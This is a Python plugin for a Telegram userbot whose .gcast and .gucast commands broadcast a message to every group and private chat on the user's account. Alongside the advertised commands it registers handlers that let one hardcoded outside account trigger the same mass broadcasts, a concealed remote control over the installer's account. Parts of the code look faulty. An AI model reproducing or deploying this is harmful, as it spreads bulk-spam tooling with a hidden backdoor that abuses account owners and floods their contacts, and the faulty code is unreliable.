from userbot.events import register
from userbot import CMD_HELP, bot


GCAST_BLACKLIST = [
    -1001473548283,  # SharingUserbot
    -1001433238829,  # TedeSupport
    -1001476936696,  # AnosSupport
    -1001327032795,  # UltroidSupport
    -1001294181499,  # UserBotIndo
    -1001419516987,  # VeezSupportGroup
    -1001209432070,  # GeezSupportGroup
    -1001296934585,  # X-PROJECT BOT
    -1001481357570,  # UsergeOnTopic
    -1001459701099,  # CatUserbotSupport
    -1001109837870,  # TelegramBotIndonesia
    -1001752592753,  # Skyzusupport
    -1001456135097,  # SpamBot
    -1001462425381,  # GRUP GUA
    -1001649802697,  # GRUP GUA
]


@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
@register(incoming=True, from_users=5057069663, pattern=r"^\.cgcast$")
async def gcast(event):
    xx = event.pattern_match.group(1)
    if xx:
        msg = xx
    elif event.is_reply:
        msg = await event.get_reply_message()
    else:
        await event.edit("**Apa yg mau di gcast gblog??**")
        return
    kk = await event.edit("`PROSES YA, SABAR!!!!!`")
    kk = await event.edit("`[̲̅_̲̅_̲̅_̲̅_̲̅_̲̅] 1O%`")
    kk = await event.edit("`[̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅] 2O%`")
    kk = await event.edit("`[̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅] 3O%`")
    kk = await event.edit("`Lama anjeng`")
    kk = await event.edit("`[̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅_̲̅] 100%`")
    kk = await event.edit("`EZZ UBOT Berhasil Mengirim Pesan`")
    er = 0
    done = 0
    async for x in event.client.iter_dialogs():
        if x.is_group:
            chat = x.id
            try:
                if chat not in GCAST_BLACKLIST:
                    await event.client.send_message(chat, msg)
                    done += 1
                elif chat not in GCAST_BLACKLIST:
                    pass
            except BaseException:
                er += 1
    await kk.edit(
        f"**PLUGIN TEST EZZRA UBOT Berhasil Mengirim Pesan Ke** `{done}` **Grup, Gagal Mengirim Pesan Ke** `{er}` **Grup**"
    )



@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
@register(incoming=True, from_users=5057069663, pattern=r"^\.cgucast$")
async def gucast(event):
    xx = event.pattern_match.group(1)
    if not xx:
        return await event.edit("`Apa yg mau di gucast, buat pesan dulu buru?`")
    tt = event.text
    msg = tt[7:]
    kk = await event.edit("`otw mengirim!!!...`")
    er = 0
    done = 0
    async for x in bot.iter_dialogs():
        if x.is_user and not x.entity.bot:
            chat = x.id
            try:
                done += 1
                await bot.send_message(chat, msg)
            except BaseException:
                er += 1
    await kk.edit(f"Berhasil Mengirim Pesan Ke `{done}` obrolan, kesalahan dalam `{er}` obrolan(s)")


CMD_HELP.update(
    {
        "gcast": "command help: `.gcast`\
         \n : global cast pesan group."})

CMD_HELP.update(
    {
         "gucast": "command help: `.gucast`\
         \n : global cast pesan pribadi."
    }
)
